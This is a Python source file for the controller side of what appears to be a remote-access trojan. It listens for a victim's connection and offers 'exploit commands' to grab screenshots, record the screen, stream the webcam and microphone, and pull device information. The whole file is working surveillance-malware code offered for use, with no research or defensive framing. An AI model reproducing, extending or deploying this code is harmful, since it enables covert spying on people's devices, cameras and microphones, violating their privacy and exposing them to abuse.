#!/usr/bin/env python3
import socket 
import sys
import os
from datetime import datetime
import threading
import platform
import webStreamer

host = socket.gethostbyname("") 
port = 8080
sock = None
conn = None

def create_server():
    try:
        global sock
        sock = socket.socket()
        print("Server started on " + host)
    except socket.error as msg:
        print("Socket Creation ERROR: " + str(msg))

def bind_socket():
    try:
        print("Binding the Port " + str(port)) 
        sock.bind((host, port))
        sock.listen(5)
    except socket.error as msg:
        print("Socket Binding error " + str(msg) + "\n" + "Retrying...")
        bind_socket()

def socket_accept():
    global conn
    conn, addr = sock.accept()

    print("\nConnection has been established | " + " IP " + addr[0] + " | Port " + str(addr[1]))
    print("WARNING: Type '--help' for usage information.\n")
    
    send_commands()

def show_usage():
    print("\n### Exploit Commands ###\n")
    print("[S] Take a screenshot")
    print("[R] Show screen recording")
    print("[W] View webcam")
    print("[M] Listem mic")
    print("[D] See device information")
    print("[Q] Quit script\n")

def send_commands():
    try:
        while True:  
            cmd = input("$ ")
            
            if cmd == "--help" or cmd == "h":
                show_usage()
            elif cmd == "S" or cmd == "s":
                conn.send(cmd.encode())
                download_screenshot(conn)
            elif cmd == "R" or cmd == "r":
                conn.send(cmd.encode())
            elif cmd == "W" or cmd == "w":
                conn.send(cmd.encode())
                
                video = webStreamer.VideoStreamer("server", conn)
                video.receiveVideo()
            elif cmd == "M" or cmd == "m":
                conn.send(cmd.encode())
                
                # this part works only on Windows and Linux (need to check and stop if OS X is used)
                client_OS = conn.recv(1024).decode()            
                if client_OS == "Darwin":
                    print("Client is running OS X. - Microphone stream doesn't work.")
                else:
                    my_OS = platform.system()
                    conn.send(my_OS.encode())

                    if my_OS != "Darwin":
                        mic = webStreamer.MicStreamer("server", conn)
                        mic.receiveMic()
            elif cmd == "Q" or cmd == "q":
                sock.close()
                sys.exit()
            else:
                print("Unknown command. Try Again!")
    except KeyboardInterrupt:		
        print("\n\nPress [Q] to quit exploit!\n")
        send_commands()

        pass

def download_screenshot(conn):
    print("\nColecting Screenshot...")
    data = conn.recv(1024)
    filesize = data.decode('utf-8')

    date = datetime.now()
    str_date = date.strftime("%d-%m-%Y %H'%M'%S")

    filename = "Screenshot_" + str_date    
    path = filename + ".png"

    print("Creating File...Alocating memory...")

    f = open(filename + ".png", 'wb')

    data = conn.recv(1024)
    totalRecv = len(data)
    f.write(data)
    
    while totalRecv < float(filesize):
        data = conn.recv(1024)
        totalRecv += len(data)
        f.write(data)
        print("{0:.2f}".format((totalRecv/float(filesize)) * 100) + \
                "% Done...", end = "\r")
        conn.send("Downloading".encode('utf-8'))

    print("\nScreenshot received!\n")
    conn.send("Download Finished!".encode('utf-8'))

if __name__ == '__main__':
    create_server()
    bind_socket()
    socket_accept()
